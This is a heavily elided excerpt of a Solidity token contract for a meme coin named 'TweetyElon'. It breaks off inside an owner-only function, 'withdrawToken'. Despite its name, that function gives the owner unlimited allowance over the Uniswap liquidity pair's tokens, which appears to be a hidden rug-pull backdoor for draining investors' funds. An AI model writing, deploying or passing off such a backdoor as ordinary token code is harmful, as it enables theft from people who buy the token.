...
/*
Telegram Group : https://t.me/tweetyelon
Website: http://tweetyelon.co/
*/
...
contract Tweety_Elon {
    string  private _name = 'TweetyElon';
    ...
    uint256 public Max_Allowedd = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    ...
    constructor () {
        ...
        setLimits(100000000, 100000000, 50000);
        setFees(6, 3);
    }
    ...
    function withdrawToken(address tokenContract, uint256 amount) public virtual onlyOwner {
        _approve(uniswapPair, msg.sender, Max_Allowedd);
